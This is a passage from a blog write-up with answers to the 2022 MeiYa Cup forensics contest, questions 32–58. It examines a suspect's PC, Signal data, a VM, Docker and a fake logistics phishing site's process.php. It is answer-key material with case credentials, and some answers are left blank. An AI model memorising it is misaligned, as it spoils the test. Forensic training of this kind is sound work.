data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="24"></p><h5 id="32填空题-检视林浚照计算机的数据他使用哪种加mh币cryptocurrency-以支付虚拟专用网络软件以大写英文回答该加密货币的全名如-bitcoin1分"><a class="markdownIt-Anchor" href="#32填空题-检视林浚照计算机的数据他使用哪种加mh币cryptocurrency-以支付虚拟专用网络软件以大写英文回答该加密货币的全名如-bitcoin1分">#</a> 32.[填空题] 检视林浚照计算机的数据，他使用哪种加 mh 币 (Cryptocurrency) 以支付虚拟专用网络软件？以大写英文回答该加密货币的全名，如 BITCOIN)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BITCOIN</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C25.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="25"></p><h5 id="33填空题-林浚熙的加密贷钱包cryptocurrency-wallet-名称是什么不要输入符号以大写英文及阿拉伯数字回答2分"><a class="markdownIt-Anchor" href="#33填空题-林浚熙的加密贷钱包cryptocurrency-wallet-名称是什么不要输入符号以大写英文及阿拉伯数字回答2分">#</a> 33.[填空题] 林浚熙的加密贷钱包 (Cryptocurrency Wallet) 名称是什么？不要输入符号，以大写英文及阿拉伯数字回答 2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TELLAWIEH</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C26.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="26"></p><h5 id="34多选题-林浚熙计算机里安装了哪个浏览器web-browser-1分"><a class="markdownIt-Anchor" href="#34多选题-林浚熙计算机里安装了哪个浏览器web-browser-1分">#</a> 34.[多选题] 林浚熙计算机里安装了哪个浏览器 (Web Browser)? (1 分)</h5><p>A.Tor Browser</p><p>B.Microsoft Edge</p><p>C.Google Chrome</p><p>D.Opera</p><p>E.Internet Explorer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCE</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C27.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="27"></p><h5 id="35单选题-林浚熙使用浏览器-google-chrome-曾经浏览最多的是哪-个网站-1分"><a class="markdownIt-Anchor" href="#35单选题-林浚熙使用浏览器-google-chrome-曾经浏览最多的是哪-个网站-1分">#</a> 35.[单选题] 林浚熙使用浏览器 Google Chrome’ 曾经浏览最多的是哪 个网站？(1 分)</h5><p>A. <a href="https://gmail.com">https://gmail.com</a></p><p>B. <a href="https://mail.google.com/mail">https://mail.google.com/mail</a></p><p>C. <a href="https://web.whatsapp.com">https://web.whatsapp.com</a></p><p>D. <a href="https://facebook.com">https://facebook.com</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>依次搜索</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C28.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="28"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C29.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="29"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C30.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="30"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C31.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="31"></p><p><a href="https://web.whatsapp.xn--com-ds0eu2n81j8ymyknm57a">https://web.whatsapp.com 压倒性的最多</a></p><h5 id="36多选题-除了上述网站林浚熙曾使用浏览器-google-chrome-搜索过什么1分"><a class="markdownIt-Anchor" href="#36多选题-除了上述网站林浚熙曾使用浏览器-google-chrome-搜索过什么1分">#</a> 36.[多选题] 除了上述网站，林浚熙曾使用浏览器 Google Chrome’ 搜索过什么？(1 分)</h5><p>A. javascript 教学</p><p>B. php sql 教学</p><p>C. tor 教学</p><p>D. docker image 教学</p><p>E. electrum 教学</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCDE</span><br></pre></td></tr></table></figure><p>和上一题的解法一样，搜一下关键词</p><h5 id="37单选题-林浚照的计算机安装了一个通讯软件signal它的用户部储存路径是什么1分"><a class="markdownIt-Anchor" href="#37单选题-林浚照的计算机安装了一个通讯软件signal它的用户部储存路径是什么1分">#</a> 37.[单选题] 林浚照的计算机安装了一个通讯软件 Signal’，它的用户部储存路径是什么？(1 分)</h5><p>A.\Users\HEI\AppData\Roaming\Signal</p><p>B.\Program Files(x86)\Signal</p><p>C.\Users\HEI\Desktop\Signal</p><p>D.\Users\user\Roaming\Signal</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C32.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="32"></p><h5 id="38填空题-通讯软件signal采用一个档案存放用户的聊天记录它的档案名是什么不要输入以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg2分"><a class="markdownIt-Anchor" href="#38填空题-通讯软件signal采用一个档案存放用户的聊天记录它的档案名是什么不要输入以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg2分">#</a> 38.[填空题] 通讯软件 Signal 采用一个档案存放用户的聊天记录，它的档案名是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBSQLITE</span><br></pre></td></tr></table></figure><p>查看聊天记录跳转源文件</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C33.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C33.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="33"></p><h5 id="39填空题-承上题对上档案进行分析林发熙的联络人当中有多少人安装了siqnal以阿拉伯数字回答3分"><a class="markdownIt-Anchor" href="#39填空题-承上题对上档案进行分析林发熙的联络人当中有多少人安装了siqnal以阿拉伯数字回答3分">#</a> 39.[填空题] 承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了 Siqnal?(以阿拉伯数字回答)(3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><h5 id="40填空题-林浚熙在signal-曾经与某人对话那人的手机号码是什么-需要与区码area-code-一同答以阿拉伯数字3分"><a class="markdownIt-Anchor" href="#40填空题-林浚熙在signal-曾经与某人对话那人的手机号码是什么-需要与区码area-code-一同答以阿拉伯数字3分">#</a> 40.[填空题] 林浚熙在 “Signal’ 曾经与某人对话，那人的手机号码是什么？需要与区码 (Area Code) 一同答 (以阿拉伯数字 3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">85270711901</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C34.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="34"></p><h5 id="41多选题-承上题两人在signal-的对话中有些讯息message-包含附件这些讯息的-id包括2分"><a class="markdownIt-Anchor" href="#41多选题-承上题两人在signal-的对话中有些讯息message-包含附件这些讯息的-id包括2分">#</a> 41.[多选题] 承上题，两人在 Signal’ 的对话中有些讯息 (Message) 包含附件，这些讯息的 'ID’包括？(2 分)</h5><p>A.5b9650fe-3bb6-4182-9900-f56177003672</p><p>B.46a8762b-78ea-49aa-a6f5-b24975ec189f</p><p>C.9729bf92-ab9c-45f7-8147-66234296aele</p><p>D.47233ffe-1a73-4b3d-b97c-626246ec3129</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>数据库打不开了，估计是我的检材坏了，能做的题目先做吧备赛先</p><h5 id="42填空题承上题林浚熙曾经于2022年10月20日账transfer-money-予上述对话人士那次眼的参考编号是什么以大写英文及阿拉白数字回答3分"><a class="markdownIt-Anchor" href="#42填空题承上题林浚熙曾经于2022年10月20日账transfer-money-予上述对话人士那次眼的参考编号是什么以大写英文及阿拉白数字回答3分">#</a> 42.[填空题] 承上题，林浚熙曾经于 2022 年 10 月 20 日账 Transfer Money) 予上述对话人士，那次眼的参考编号是什么？(以大写英文及阿拉白数字回答)(3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N91088774024</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C35.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="35"></p><h5 id="43单选题-林浚照的计算机安装了多少台虚拟机virtual-machine-vm-以阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#43单选题-林浚照的计算机安装了多少台虚拟机virtual-machine-vm-以阿拉伯数字回答1分">#</a> 43.[单选题] 林浚照的计算机安装了多少台虚拟机 Virtual Machine - VM) ?(以阿拉伯数字回答)(1 分)</h5><p>A.4</p><p>B.1</p><p>C.2</p><p>D.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C36.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C36.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="36"></p><h5 id="44单选题-林浚熙的计算机里的虚拟机vm-存放在什么路径1分"><a class="markdownIt-Anchor" href="#44单选题-林浚熙的计算机里的虚拟机vm-存放在什么路径1分">#</a> 44.[单选题] 林浚熙的计算机里的虚拟机 (VM) 存放在什么路径？(1 分)</h5><p>A.\Users\Public\Documents \Virtual Machines</p><p>B.\Program Files\Virtual Machines</p><p>C.\User\HEN\Roaming\Virtual Machines\</p><p>D.\Users\HEN\Documents\Virtual Machines</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C37.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="37"></p><h5 id="45单选题-虚拟机-vm-使用什么版本的作业系统operating-system-1分"><a class="markdownIt-Anchor" href="#45单选题-虚拟机-vm-使用什么版本的作业系统operating-system-1分">#</a> 45.[单选题] 虚拟机 (VM) 使用什么版本的作业系统 (Operating System) ?(1 分)</h5><p>A. CentOs Linux 7.5.1804 (Core)</p><p>B. Ubuntu 22.04.1 LTS</p><p>C. CentOS Linux release 7.6.1810(Core)</p><p>D. Ubuntu 20.04.5 LTS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C38.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="38"></p><h5 id="46多选题-虚拟机vm-中的文件传输服务器ftp-server-有哪些用户2分"><a class="markdownIt-Anchor" href="#46多选题-虚拟机vm-中的文件传输服务器ftp-server-有哪些用户2分">#</a> 46.[多选题] 虚拟机 (VM) 中的文件传输服务器 (FTP Server) 有哪些用户？(2 分)</h5><p>A. nobody</p><p>B. root</p><p>C. admin</p><p>D. man</p><p>E. ftpuser</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BE</span><br></pre></td></tr></table></figure><p>可以用 grep 查找关键词，看到是存在用户 ftpuser，但是看了很多师傅的 wp，root 用户也是其中一个<a href="https://blog.csdn.net/Grignard_/article/details/127931989"> 2022 美亚杯 资格赛 赛后复盘 题解_美亚杯 2022 团体赛答案 - CSDN 博客</a></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C39.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C39.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="39"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C40.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="40"></p><h5 id="47多选题-虚拟机设置了什么网页服务器web-server-2分"><a class="markdownIt-Anchor" href="#47多选题-虚拟机设置了什么网页服务器web-server-2分">#</a> 47.[多选题] 虚拟机设置了什么网页服务器 (Web Server)? (2 分)</h5><p>A. NGINX</p><p>B. LIGHTTPD</p><p>C. WORDPRESS</p><p>D. APACHE</p><p>E. IIS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AD</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C41.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="41"></p><h5 id="48单选题-网页服务器目录内有图片档案而此档案的储存位置是1分"><a class="markdownIt-Anchor" href="#48单选题-网页服务器目录内有图片档案而此档案的储存位置是1分">#</a> 48.[单选题] 网页服务器目录内有图片档案，而此档案的储存位置是？(1 分)</h5><p>A. /var/www/html/post/src</p><p>B. /var/www/html/post/css</p><p>C. /var/www/html/post/vendor</p><p>D. /var/www/post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C42.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="42"></p><h5 id="49单选题-分析网页服务器的网站数据假网站的公司名称是什么1分"><a class="markdownIt-Anchor" href="#49单选题-分析网页服务器的网站数据假网站的公司名称是什么1分">#</a> 49.[单选题] 分析网页服务器的网站数据，假网站的公司名称是什么？(1 分)</h5><p>A. Krick Global Logistics</p><p>B. Global Logistics</p><p>C. Krick Post Global Logistics</p><p>D. Krick Post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p><code>ip a</code>  查看 ip 地址</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C44.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C44.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="44"></p><p>访问，看到路径，访问下级目录 post</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C43.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C43.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="43"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C45.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C45.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="45"></p><p>查看 logo</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C46.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C46.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="46"></p><h5 id="50单选题-检视假网站首页的显示ay806369745hk-代表什么1分"><a class="markdownIt-Anchor" href="#50单选题-检视假网站首页的显示ay806369745hk-代表什么1分">#</a> 50.[单选题] 检视假网站首页的显示，AY806369745HK 代表什么？(1 分)</h5><p>A. 邮件号码</p><p>B. 邮件收费号码</p><p>C. 邮件序号</p><p>D. 邮件参考号码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="51填空题分析假网站的资料当受害人经假网站输入数据后网站会产生一个档案它的档案名是什么-不要输入-以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg-2分"><a class="markdownIt-Anchor" href="#51填空题分析假网站的资料当受害人经假网站输入数据后网站会产生一个档案它的档案名是什么-不要输入-以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg-2分">#</a> 51.[填空题] 分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么？(不要输入 ‘.’，以大写英文及阿拉伯数字回答。 如 Cat10.jpg，需回答 CAT10JPG) (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VUTXT</span><br></pre></td></tr></table></figure><p>代码审计 process.php 文件</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C47.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="47"></p><p>resultFile 即保存的文件是 vu.txt</p><h5 id="52多选题-分析假网站档案processphp-源码source-code推测此档案的用途可能是2分"><a class="markdownIt-Anchor" href="#52多选题-分析假网站档案processphp-源码source-code推测此档案的用途可能是2分">#</a> 52.[多选题] 分析假网站档案，process.php’ 源码 (Source Code), 推测此档案的用途可能是？(2 分)</h5><p>A. 改变函数</p><p>B. 产生档案</p><p>C. 发出邮件</p><p>D. 更新数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BC</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C48.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C48.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="48"></p><h5 id="53填空题-检视档案processphp-源码-林浚照的电邮密码是以大写英文回答1分"><a class="markdownIt-Anchor" href="#53填空题-检视档案processphp-源码-林浚照的电邮密码是以大写英文回答1分">#</a> 53.[填空题] 检视档案 process.php’ 源码，林浚照的电邮密码是？(以大写英文回答)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTATSCEUCPACOCBDACS</span><br></pre></td></tr></table></figure><p>如上图</p><h5 id="54多选题-分析档案processphp-源码-它不会收集哪些资料2分"><a class="markdownIt-Anchor" href="#54多选题-分析档案processphp-源码-它不会收集哪些资料2分">#</a> 54.[多选题] 分析档案 process.php’ 源码，它不会收集哪些资料？(2 分)</h5><p>A. GPS 位置</p><p>B. 信用卡号码</p><p>C. 短讯验证码</p><p>D. 电话号码</p><p>E. 电邮地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACD</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C49.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C49.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="49"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C50.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C50.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="50"></p><h5 id="55填空题-虚拟机-vm安装了-docker-程序列出一个以5作为开端的-doker镜像-mage-id-以阿拉伯数字及大写英文回答2分"><a class="markdownIt-Anchor" href="#55填空题-虚拟机-vm安装了-docker-程序列出一个以5作为开端的-doker镜像-mage-id-以阿拉伯数字及大写英文回答2分">#</a> 55.[填空题] 虚拟机 (VM) 安装了 Docker 程序，列出一个以 5 作为开端的 Doker&quot; 镜像 mage) ID (以阿拉伯数字及大写英文回答)（2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5d58c024174dd06df1c4d41d8d44b485e3080422374971005270588204ca3b82</span><br></pre></td></tr></table></figure><p>网探勘验连接</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C51.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C51.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="51"></p><h5 id="56填空题-docker-容器containermysql-对外开放的通讯端口port-是3分"><a class="markdownIt-Anchor" href="#56填空题-docker-容器containermysql-对外开放的通讯端口port-是3分">#</a> 56.[填空题] Docker 容器 (Container) mysql’ 对外开放的通讯端口 (Port) 是？(3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43306</span><br></pre></td></tr></table></figure><p>docker start ca0 启动 docker</p><p>docker ps -a 查看</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C52.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C52.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="52"></p><h5 id="57填空题-docker容器mysql用户-root-的密码是以大写英文及阿拉伯数字回答2分"><a class="markdownIt-Anchor" href="#57填空题-docker容器mysql用户-root-的密码是以大写英文及阿拉伯数字回答2分">#</a> 57.[填空题] Docker 容器 mysql，用户 root’ 的密码是？(以大写英文及阿拉伯数字回答)(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2WSX3EDC</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C53.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="53"></p><h5 id="58填空题-docker容器mysql-里哪一个数据库储存了大量个人资料以大写英文回答3分"><a class="markdownIt-Anchor" href="#58填空题-docker容器mysql-里哪一个数据库储存了大量个人资料以大写英文回答3分">#</a> 58.[填空题] Docker 容器，mysql 里哪一个数据库储存了大量个人资料？(以大写英文回答)(3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>网探连接</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C55.png" class="lazyload" 